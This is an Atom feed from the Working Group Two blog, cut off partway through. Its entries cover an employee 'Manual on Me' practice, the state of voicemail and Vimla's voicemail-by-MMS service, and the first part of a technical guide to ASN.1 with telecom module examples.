<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://www.wgtwo.com/blog</id>
    <title>Working Group Two Blog</title>
    <updated>2022-02-08T00:00:00.000Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://www.wgtwo.com/blog"/>
    <subtitle>Working Group Two Blog</subtitle>
    <icon>https://www.wgtwo.com/img/favicons/favicon.ico</icon>
    <entry>
        <title type="html"><![CDATA[Manual on Me: Matt Long]]></title>
        <id>manual-on-me-matt-long</id>
        <link href="https://www.wgtwo.com/blog/manual-on-me-matt-long"/>
        <updated>2022-02-08T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[As I was waking up this morning, I started surfing Reddit.  One post, in particular, jumped out at me.  In this post, the writer (OP in Reddit parlance) had been asked to take a personality test at work by a new supervisor.   The OP was asking if this was something they should agree to do.]]></summary>
        <content type="html"><![CDATA[<p>As I was waking up this morning, I started surfing Reddit.  One post, in particular, jumped out at me.  In this post, the writer (OP in Reddit parlance) had been asked to take a personality test at work by a new supervisor.   The OP was asking if this was something they should agree to do.</p><p>The responses varied.  Some were mildly positive, but most were very cynical since this sort of testing can be misused by bad management.  However, this got me thinking and, eventually, writing this post.</p><p>Let's look at the supervisor mentioned on Reddit and view their actions in a charitable light.  It is entirely probable that they only wanted to better understand and work with their new direct reports.  This is undoubtedly great!  However, a personality test is not a particularly useful tool for this -- people are too varied, and lives are too complicated.  This <a href="https://knowledge.wharton.upenn.edu/article/the-science-of-personality-understanding-yourself-and-those-around-you/" target="_blank" rel="noopener noreferrer">interview</a> with Brian Little, the author of "Me, Myself and Us: The Science of Personality and the Art of Well-Being," discusses some of the problems with these sorts of assessments.</p><p>And as an employee, who wants a supervisor that uses an impersonal online test to figure out the best way to work with someone?</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="our-process">Our Process<a class="hash-link" href="#our-process" title="Direct link to heading">​</a></h2><p>At <a href="https://www.wgtwo.com" target="_blank" rel="noopener noreferrer">Working Group Two</a>, we do things a little bit differently.  We follow a straightforward process of <a href="https://www.wgtwo.com/blog/were-all-grownups-here/" target="_blank" rel="noopener noreferrer">treating employees like grownups</a>.  I thought it might be worth talking about how we handle the "let's try to understand our employees" problem and share a public version of what I have shared inside the company.</p><p>The short answer to this is this: just ask.  Amazing!</p><p>When new employees start working with us, we ask them to fill out a "Manual on Me." Since we are a distributed company and everyone is <em>de-facto</em> remote, this manual serves two purposes: it is a bit of an icebreaker and a powerful communication tool.  Everyone in the company has a "Manual on Me," from the CEO and CTO to the most recent new hire.</p><p>As Professor Little notes: "Once you understand what a person's core projects are or even ask a person, 'How is it going, David?,' it puts us in a position where we can actually treat humans as humans.  That to me is going to pay enormous benefits in the long term."</p><p>Here's what I was asked to put into <em>my</em> manual:</p><ul><li>What I know about that people can ask me</li><li>How I think about things</li><li>Common mistakes I make in my interactions with others</li><li>My expectations from others</li><li>What frustrates me</li><li>How to reach out and get in touch with me</li><li>How to give me feedback</li></ul><p>Although nobody in the company remembers how this practice actually started, this is not a completely new idea.  I see that there are a few references to this concept around the internet, including at least one <a href="https://www.manualof.me" target="_blank" rel="noopener noreferrer">online version</a>.  Their <a href="https://www.manualof.me/about" target="_blank" rel="noopener noreferrer">about page</a> cites a few previous inspirations and sources for this "personal user manual."</p><p>So how does this solve the problem on Reddit?  Assuming the OP's new supervisor really wanted to know their employees, they could <em>just ask</em> and probably find out just as much (or more) than having everyone take the MBTI.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="my-manual-on-me">My "Manual on Me"<a class="hash-link" href="#my-manual-on-me" title="Direct link to heading">​</a></h2><p>So what does my "Manual on Me" look like?  Here is what I wrote in the summer of 2018:</p><div class="admonition admonition-note alert alert--secondary"><div class="admonition-heading"><h5><span class="admonition-icon"><svg xmlns="http://www.w3.org/2000/svg" width="14" height="16" viewBox="0 0 14 16"><path fill-rule="evenodd" d="M6.3 5.69a.942.942 0 0 1-.28-.7c0-.28.09-.52.28-.7.19-.18.42-.28.7-.28.28 0 .52.09.7.28.18.19.28.42.28.7 0 .28-.09.52-.28.7a1 1 0 0 1-.7.3c-.28 0-.52-.11-.7-.3zM8 7.99c-.02-.25-.11-.48-.31-.69-.2-.19-.42-.3-.69-.31H6c-.27.02-.48.13-.69.31-.2.2-.3.44-.31.69h1v3c.02.27.11.5.31.69.2.2.42.31.69.31h1c.27 0 .48-.11.69-.31.2-.19.3-.42.31-.69H8V7.98v.01zM7 2.3c-3.14 0-5.7 2.54-5.7 5.68 0 3.14 2.56 5.7 5.7 5.7s5.7-2.55 5.7-5.7c0-3.15-2.56-5.69-5.7-5.69v.01zM7 .98c3.86 0 7 3.14 7 7s-3.14 7-7 7-7-3.12-7-7 3.14-7 7-7z"></path></svg></span>Manual on Me</h5></div><div class="admonition-content"><p><img src="/assets/images/mtl-grayscale-f68c6613dbdf0c21199e454c0b303400.png" width="200" height="200"></p><p><strong>What I know something about:</strong></p><ul><li>I know a little bit about a lot of things.</li><li>Recently, I've been doing a lot of cloud infrastructure work, so that is freshest in my mind.</li><li>I've also had experience with development of embedded Java VMs, garbage collection, graphics drivers, distributed workflow systems, robotics, AI, machine learning, and autonomous ships.</li></ul><p><strong>How I think about things:</strong></p><ul><li>I like to challenge how things are done and find simpler solutions.  This often involves understanding why things are currently done the way they are.</li><li>I very much like to think about an end goal and develop solutions <em>towards</em> the goal.</li><li>While I like to think a little about the steps in the middle, I don't like planning them in great detail.</li></ul><p><strong>Common mistakes I make in my interaction with you:</strong></p><ul><li>Sometimes, I will offer possibilities and suggestions as a way of discussion -- sort of like the "rubber duck" development process.  This is not <em>meant</em> as a negative criticism but intended to continue the conversation and explore possibilities.  But I do understand how it can be interpreted in other ways.  Let me know if this is annoying!</li></ul><p><strong>My expectations to you:</strong></p><ul><li>I expect people to try, experiment, and learn.</li><li>I also hope that everyone feels comfortable speaking up and expressing their point of view and ideas.</li><li>If something is not clear, ask for clarification.</li></ul><p><strong>What frustrates me:</strong></p><ul><li>Bureaucracy, particularly rules that exist without an explanation of why the rule exists.</li><li>Broken software systems.  When tied with bureaucracy, these are often known as "Enterprise software."</li></ul><p><strong>How to reach out to me:</strong></p><ul><li>I prefer asynchronous messaging<ul><li>Work Slack is absolutely the easiest way to reach me</li><li>SMS is second-best</li></ul></li><li>Voice is also fine as long as it is a reasonable time or arranged through one of the async methods.</li></ul><p><strong>How to give me feedback:</strong></p><ul><li>I like feedback, and direct, actionable feedback is fantastic!</li><li>If it is serious, I like to have time to digest the feedback before I need to give a response, if possible.</li></ul></div></div><p>Most of this is still true, but maybe it is time for an update!</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="a-management-perspective">A management perspective<a class="hash-link" href="#a-management-perspective" title="Direct link to heading">​</a></h2><p>As a manager who likes to make sure my team is happy and enjoying their work (to the extent that I can do so), I really like these.</p><p>When talking to new colleagues, I have a great way to start conversations ("So, where have you been climbing recently?", "How're the corona regulations in Canada these days?", "What type of photography do you like to do?").</p><p>They also help with giving and receiving feedback.  Should I drop a note into Slack, then set up a video meeting?  How blunt should I be?  Should I expect to talk about the feedback immediately or schedule a follow-up meeting after they (or I) have had a chance to think?</p><p>But most importantly, we feel that the "Manual on Me" is a respectful, adult way to communicate preferences without trying to pigeonhole everyone into one of sixteen types.</p>]]></content>
        <author>
            <name>Matt Long</name>
            <uri>https://www.linkedin.com/in/mattlong/</uri>
        </author>
        <category label="trust" term="trust"/>
        <category label="culture" term="culture"/>
        <category label="startup" term="startup"/>
        <category label="manual-on-me" term="manual-on-me"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[Don't leave a message after the beep]]></title>
        <id>please-dont-leave-a-message-after-the-beep</id>
        <link href="https://www.wgtwo.com/blog/please-dont-leave-a-message-after-the-beep"/>
        <updated>2022-02-04T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[Think quickly: When was the last time you dialed into your voicemail to listen to a message someone had left for you? Chances are, it’s been a while. The common view is that voicemail isn’t popular any longer. That’s both true and not true, depending on how you look at it. Find out where voicemail - loved by some and hated by others - is heading.]]></summary>
        <content type="html"><![CDATA[<p>Think quickly: When was the last time you dialed into your voicemail to listen to a message someone had left for you? Chances are, it’s been a while. The common view is that voicemail isn’t popular any longer. That’s both true and not true, depending on how you look at it. Find out where voicemail - loved by some and hated by others - is heading.</p><p>“Please leave your message after the beep” - you’ve probably heard it a million times, especially if you were born before 1982. Or you’ve repeated that sentence over and over as you tried to make an attractive recording of your own voice as your greeting to a missed caller. We knew it wasn’t necessary to say it (people knew what to do after the beep) but we still recorded it that way. Probably because we didn’t know what else to say.</p><p>For many of us, those days are over. We just don’t bother with setting up our voicemails, we never leave voicemails and we certainly never dial up to listen to a message someone left for us. For my own part, I don’t even know if people who call me get to a voicemail system.</p><p>To others, voicemail is really crucial.</p><blockquote><p>“We see the importance of voicemail increasing or declining based on specific demographics,” says Luke Campbell, the CEO of <a href="https://www.vxt.co.nz" target="_blank" rel="noopener noreferrer">Vxt</a>, a communications technology company in New Zealand.</p></blockquote><p>Luke describes people working in transactional industries as particularly passionate about voicemail. Lawyers, real estate agents, plumbers - they might get dozens of calls every day. So where others turn off voicemail, these people might want to get their voicemails forwarded to their emails, be able to share their inbox with a colleague or assistant, have voicemails automatically translated to text and integrate their messages with productivity tools like Asana or an ERP system. Some need to have their messages stored for regulatory or security purposes. A real estate agent with (say) 10 000 contacts may want to customize the greetings so that every time one of the 200 Johns or Jessicas call, they get a personal message stating their name. To some, that might be a differentiator, to others a nuisance.</p><p>Besides, Luke tells me, how dying is voicemail really, when in New Zealand, there are two million voicemails left every day, in a population of 4,6 million?</p><h3 class="anchor anchorWithStickyNavbar_mojV" id="a-vocal-assistant">A vocal assistant<a class="hash-link" href="#a-vocal-assistant" title="Direct link to heading">​</a></h3><p>Karel Bourgois paints a similar picture. He’s the CEO of <a href="https://www.voxist.com" target="_blank" rel="noopener noreferrer">Voxist</a>, a voicemail and messaging app, based in France. He’s seen voicemail transform into more of a productivity tool for businesses. Young people might still play around with things like customizing their voicemail greetings to individual callers, but in general, they don’t like talking.</p><img src="/img/blog/voicemail.jpeg" alt="Breaking up via voicemail" width="300"><blockquote><p>“I see voicemail becoming more like a vocal assistant. A restaurant, for example, can let patrons reserve tables directly into the booking system just using their voices. A law firm or a bank can integrate voicemail with their CRM systems. A big movement now is to move voice messaging into core automation,” Karel says.</p></blockquote><p>So voicemail systems continue to evolve. Users either don’t want voicemail or they want a voicemail service that can travel with them across devices, operators and national borders.</p><p>To Luke Campbell, the very challenge of requiring people dial into a voicemail service and listen to a bunch of commands before you get to your messages was in itself a problem big enough to be solved for kickstarting his business. Vxt started as a voice messaging service and today has evolved into a communication automation company, echoing Karel’s observations.</p><h3 class="anchor anchorWithStickyNavbar_mojV" id="the-routes-you-can-go-down">The routes you can go down<a class="hash-link" href="#the-routes-you-can-go-down" title="Direct link to heading">​</a></h3><p>If you want to improve the voicemail experience, one route you can go down is to add more features, to make it more flexible and powerful.</p><p>Another route is to make the user experience simpler. To make it easier and faster to listen to voicemail.</p><p>That’s essentially what Working Group Two and the Swedish mobile operator challenger <a href="https://vimla.se" target="_blank" rel="noopener noreferrer">Vimla</a> did. In response to a regulatory challenge by the Swedish Post &amp; Telecom Authority (PTS), Vimla recently launched a voicemail service where messages get delivered to a user’s phone as an audio file (via MMS). The customer can listen to it whenever he/she wants without needing to dial into the messaging system. As a result, hackers can no longer get access to other people’s voicemails (which PTS had set out to stop) and customers get a better messaging experience.</p><p>This simple, yet elegant solution serves as a powerful example of another and more fundamental development in the telecom industry. For a few years, Working Group Two has developed and managed the mobile core network of Vimla as-a-service in the cloud, enabling Vimla to operate its network both more efficiently and taking advantage of micro innovation at scale. When this challenge came around from PTS it took Vimla only a few months to respond with this lightweight and efficient solution. Working Group Two’s developers used existing APIs to connect two otherwise separate systems (voicemail and MMS). The API-based bridge between them allowed voicemails to be sent as MMS. Today, tens of thousands messages are sent every day in the Vimla network.</p><blockquote><p>“We genuinely think this is a better product for our customers,” says Viktor Georgsson, Head of Operations with Vimla.</p></blockquote><p>Other operators in Sweden responded to the PTS requirements by beefing up their security systems and protecting voicemail inboxes with longer authentication codes and more rigorous encryption. Perhaps at the expense of the customer experience.</p><h3 class="anchor anchorWithStickyNavbar_mojV" id="ask-yourself-four-questions">Ask yourself four questions...<a class="hash-link" href="#ask-yourself-four-questions" title="Direct link to heading">​</a></h3><p>At the end of the day, voicemail must face the test of any other digital product, says Marius Waldum, the Head of Product at Working Group Two. He’s in charge of the effort of developing the company’s ecosystem platform - where third party digital products are developed to run and meet users across multiple operators worldwide. Working Group Two has developed a standardized voicemail product called Voicebox, from which Vimla’s solution took its inspiration.</p><p>You need to ask yourself four questions, Marius points out. First, is the product <strong>valuable</strong> to its users? Is it <strong>usable</strong> for them? Is it <strong>possible to build</strong>? And is it <strong>economically viable</strong>?</p><blockquote><p>“Voicemail is a powerful reminder that a product doesn’t need to be desired by everyone, but by someone,” Marius concludes.</p></blockquote>]]></content>
        <author>
            <name>Tor Odland</name>
            <uri>https://www.linkedin.com/in/torodland/</uri>
        </author>
        <category label="messaging" term="messaging"/>
        <category label="voicemail" term="voicemail"/>
        <category label="api" term="api"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[The specs behind the specs part 1]]></title>
        <id>the-specs-behind-the-specs-part-1</id>
        <link href="https://www.wgtwo.com/blog/the-specs-behind-the-specs-part-1"/>
        <updated>2022-01-11T00:00:00.000Z</updated>
        <summary type="html"><![CDATA["Abstract Syntax Notation One (ASN.1) is a standard interface]]></summary>
        <content type="html"><![CDATA[<p>"Abstract Syntax Notation One (ASN.1) is a standard interface
description language for defining data structures that can be
serialized and deserialized in a cross-platform way." -
<a href="https://en.wikipedia.org/wiki/ASN.1" target="_blank" rel="noopener noreferrer">Wikipedia</a></p><h1>Introduction</h1><p>Today you'll read about a specific language used to describe many of
the messages in the telecom specifications. It will be a deep-dive
into technical parts, so I imagine you could just use the blog post
when you want to look up different parts without fully reading it.</p><p>In <strong>wgtwo</strong> we use this language for some specific telco
messages (such as SIGTRAN layers TCAP/MAP/CAP, as well as S1AP, NGAP
and probably some more). They are defined directly in some of the
telecom specifications, and because of that it is possible to use them
to send messages between different telecom cores.</p><p>This will <em>probably</em> be a two piece blog post as there is another
interface describing language which is not ASN.1, and this is already
a very long post. The other specification is used in Diameter
dictionaries, but I'll spare those for now. It has already taken me
about half a year to finish up this article.</p><p>There might be some Erlang specific paragraphs here and there, but
this blog post is mainly about ASN.1 as a specification, which can be
used in any language supporting it.  For Erlang specifics I came
across <a href="https://medium.com/erlang-battleground/erlang-asn-1-abstract-syntax-notation-one-deeb8300f479" target="_blank" rel="noopener noreferrer">this blog
post</a>
written by Viacheslav Katsuba, and because it is build into Erlang by
default I recommend the
<a href="https://www.erlang.org/doc/apps/asn1/asn1_getting_started.html" target="_blank" rel="noopener noreferrer">APIs</a>
as well.</p><p><strong>DISCLAIMER: SEVERE HEADACHE MIGHT FOLLOW.</strong></p><h1>Abstract Syntax Notation One</h1><p>Abstract Syntax Notation One (ASN.1 for short) provides a
high level description of messages. It abstracts the language
implementations from the protocol design.</p><p>It was initially used by <a href="https://en.wikipedia.org/wiki/Open_Systems_Interconnection" target="_blank" rel="noopener noreferrer">Open Systems Interconnection
(OSI)</a> to
describe email messages but is used by many other applications
especially within telecommunications and cryptography.</p><p>You might have heard of similar such abstract syntax notations used
for interface definitions such as Google Protocol Buffers, or
Facebook's Apache Thrift, but those languages have not been managed by
a standardization organization, so the owning corporations could (in
theory) make breaking changes or change the license or even remove the
language definitions overnight.</p><p>Anyway, back to ASN.1</p><p>The first ASN.1 standardization came out 1984, and there have been
many improvements since, for instance with the 1994 update which added
extended functionality for telecommunication technologies.</p><p>"Long live ASN.1!" - Olivier Dubuisson from the <a href="https://www.oss.com/asn1/resources/books-whitepapers-pubs/asn1-books.html#dubuisson" target="_blank" rel="noopener noreferrer">best
book</a>
that I've read on the subject. (How many ASN.1 books are there you
might wonder? Actually there were <a href="https://www.oss.com/asn1/resources/books-whitepapers-pubs/asn1-books.html" target="_blank" rel="noopener noreferrer">more
books</a>
than I expected on the subject, but to make it perfectly clear: I did
only read the one.)</p><p>Off-topic but a bit of a fun fact I got from reading the book which I
didn't know about before is that 'little Endian' and 'big Endian',
which are used to denote if the bitstring should be read from leftmost
or rightmost bit, actually originates from the 1726 best-seller
<a href="https://www.ling.upenn.edu/courses/Spring_2003/ling538/Lecnotes/ADfn1.htm" target="_blank" rel="noopener noreferrer">Gulliver's
travels</a>.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="the-how-and-why">The how and why<a class="hash-link" href="#the-how-and-why" title="Direct link to heading">​</a></h2><p>ASN.1 builds on the following ideas:</p><ul><li>Data structures to be transmitted should be described regardless of
programming language used transmitting or receiving them.</li><li>The notation should allow building complex data types from basic
types, and be able to do so recursively.</li><li>The notation must be formal to prevent ambiguities.</li></ul><p>That said, ASN.1 is not an abstract syntax in itself, but a language
to describe abstract syntaxes.</p><p>There are currently four main ASN.1 specifications (listed below), as
well as at least one specification per encoding rule (listed in the
<a href="#encodings">last section</a>).</p><table><thead><tr><th>ITU-T no</th><th>ASN.1 specifications</th></tr></thead><tbody><tr><td><a href="https://www.itu.int/rec/T-REC-X/recommendation.asp?lang=en&amp;parent=T-REC-X.680" target="_blank" rel="noopener noreferrer">X.680</a></td><td>Abstract Syntax Notation One (ASN.1): Specification of basic notation</td></tr><tr><td><a href="https://www.itu.int/rec/T-REC-X/recommendation.asp?lang=en&amp;parent=T-REC-X.681" target="_blank" rel="noopener noreferrer">X.681</a></td><td>Abstract Syntax Notation One (ASN.1): Information object specification</td></tr><tr><td><a href="https://www.itu.int/rec/T-REC-X/recommendation.asp?lang=en&amp;parent=T-REC-X.682" target="_blank" rel="noopener noreferrer">X.682</a></td><td>Abstract Syntax Notation One (ASN.1): Constraint specification</td></tr><tr><td><a href="https://www.itu.int/rec/T-REC-X/recommendation.asp?lang=en&amp;parent=T-REC-X.683" target="_blank" rel="noopener noreferrer">X.683</a></td><td>Abstract Syntax Notation One (ASN.1): Parameterization of ASN.1 specifications</td></tr></tbody></table><h1>Nitty gritty</h1><h2 class="anchor anchorWithStickyNavbar_mojV" id="modules">Modules<a class="hash-link" href="#modules" title="Direct link to heading">​</a></h2><p>The purpose of an ASN.1 module is to name a collection of types and/or
value definitions.</p><p>It consist of a module reference and an optional object identifier
together with the declaration of the <code>DEFINITIONS</code> type definition.
Note that even though the object identifier is optional, it is
considered bad practice to leave it out. The reason for it being
optional is for backward compatibility; it was not part of the
original ASN.1 specification.
The <code>DEFINITIONS</code> keyword usually comes together with the <code>BEGIN</code> and
<code>END</code> keywords so multiple definitions can be done. (What else is the
point of a module if not to make a collection...).</p><p>The Erlang ASN.1 compiler requires each module to be in a separate
file, but generally one ASN.1 file could contain many modules.  Usual
file endings are <code>.asn</code> and <code>.asn1</code>. One
<a href="https://www.erlang.org/doc/apps/asn1/asn1_getting_started.html#multi-file-compilation" target="_blank" rel="noopener noreferrer">trick</a>
that can be used to circumvent this Erlang specific problem is to list
multiple ASN.1 files in a new file ending with <code>set.asn</code>.</p><p>One example of a file with many modules exist in the CAP specification
<a href="https://portal.3gpp.org/desktopmodules/Specifications/SpecificationDetails.aspx?specificationId=1597" target="_blank" rel="noopener noreferrer">3GPP TS 29.078</a></p><p>The ASN.1 template for a module</p><div class="codeBlockContainer_I0IT language-asn.1 theme-code-block"><div class="codeBlockContent_wNvx asn.1"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token plain">ModuleReference ObjectIdentifier</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">DEFINITIONS ::= BEGIN</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">END</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p>as seen in an example</p><div class="codeBlockContainer_I0IT language-asn.1 theme-code-block"><div class="codeBlockContent_wNvx asn.1"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token plain">CAP-operationcodes {itu-t(0) identified-organization(4) etsi(0) mobileDomain(0) umts-network(1)</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">modules(3) cap-operationcodes(53) version8(7)}</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">DEFINITIONS ::= BEGIN</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p>For information about the object identifier see the <a href="#object-identifier">types section</a></p><h3 class="anchor anchorWithStickyNavbar_mojV" id="importing-from-other-modules">Importing from other modules<a class="hash-link" href="#importing-from-other-modules" title="Direct link to heading">​</a></h3><p>Importing types, values and other structures from other modules can be
done with the <code>IMPORTS</code> and <code>FROM</code> keywords in the beginning of the
module body.  The <code>IMPORTS</code> keyword ends with a single semicolon <code>;</code>,
and the different imported definitions are comma-separated.</p><p>The meaning of the optional <code>IMPLICIT TAGS</code> keywords I'll handle
<a href="#automatic-implicit-explicit-tags">later</a>.</p><div class="codeBlockContainer_I0IT language-asn.1 theme-code-block"><div class="codeBlockContent_wNvx asn.1"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token plain">CAP-datatypes {itu-t(0) identified-organization(4) etsi(0) mobileDomain(0) umts-network(1) modules(3) cap-datatypes(52) version8(7)}</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">DEFINITIONS IMPLICIT TAGS ::= BEGIN</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">IMPORTS</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    Duration,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    Integer4,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    Interval,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    LegID,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    ServiceKey</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">FROM CS1-DataTypes {itu-t(0) identified-organization(4) etsi(0) inDomain(1) in-network(1)</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">modules(0) cs1-datatypes(2) version1(0)}</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    BothwayThroughConnectionInd,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    CriticalityType,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    MiscCallInfo</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">FROM CS2-datatypes {itu-t(0) identified-organization(4) etsi(0) inDomain(1) in-network(1)</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">cs2(20) modules(0) in-cs2-datatypes(0) version1(0)}</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">-- ...more imports...</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">; -- IMPORTS end here</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">END -- CAP-datatypes ends here --</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">-- CAP-errortypes module starts here --</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">CAP-errortypes {itu-t(0) identified-organization(4) etsi(0) mobileDomain(0) umts-network(1) modules(3) cap-errortypes(51) version8(7)}</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">DEFINITIONS IMPLICIT TAGS ::= BEGIN</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">END -- CAP-errortypes ends here --</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p>The type definitions <code>Duration</code> and <code>LegID</code> above are imported from
<code>CS1-DataTypes</code> module, while <code>MiscCallInfo</code> comes from
the <code>CS2-datatypes</code> module.</p><h3 class="anchor anchorWithStickyNavbar_mojV" id="exporting-from-a-module">Exporting from a module<a class="hash-link" href="#exporting-from-a-module" title="Direct link to heading">​</a></h3><p>Exports from a module are done in a similar fashion.</p><p>If the <code>EXPORT</code> keyword is not used in a module, the ASN.1 compilers
should export all values and types from the module. It's the same as
specifying <code>EXPORTS ALL;</code>.</p><div class="codeBlockContainer_I0IT language-asn.1 theme-code-block"><div class="codeBlockContent_wNvx asn.1"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token plain">CAP-GPRS-ReferenceNumber {itu-t(0) identified-organization(4) etsi(0) mobileDomain(0)</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">umts-network(1) modules(3) cap-dialogueInformation(111) version8(7)}</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">DEFINITIONS ::= BEGIN</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">EXPORTS</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    id-CAP-GPRS-ReferenceNumber,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    cAP-GPRS-ReferenceNumber-Abstract-Syntax;</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">IMPORTS</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    Integer4</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">FROM CS1-DataTypes {itu-t(0) identified-organization(4) etsi(0) inDomain(1) in-network(1)</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">modules(0) cs1-datatypes(2) version1(0)}</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">;</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">END</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><h3 class="anchor anchorWithStickyNavbar_mojV" id="commenting">Commenting<a class="hash-link" href="#commenting" title="Direct link to heading">​</a></h3><p>As can be seen in the above example one can enter comments into the
ASN.1.  Comments starts with double dash <code>--</code> and ends with either a
newline or another <code>--</code>, whichever comes first.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="assignments-and-naming">Assignments and naming<a class="hash-link" href="#assignments-and-naming" title="Direct link to heading">​</a></h2><p>The rules specify that type references must start with an uppercase
letter and may not end with a dash <code>-</code>. It may also only contain
upper- and lower-case letters, digits or dashes <code>-</code>.  The syntax for a
type assignment is</p><div class="codeBlockContainer_I0IT language-asn.1 theme-code-block"><div class="codeBlockContent_wNvx asn.1"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token plain">TypeRef ::= TypeDefinition</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p>For instance</p><div class="codeBlockContainer_I0IT language-asn.1 theme-code-block"><div class="codeBlockContent_wNvx asn.1"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token plain">InvokeIdType ::= INTEGER (-128..127)</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">CancelArg ::= CHOICE {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    invokeID        [0] InvokeID,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    allRequests     [1] NULL</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">}</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">Duration ::= INTEGER (-2..86400)</span><br></span><span class="token-line" 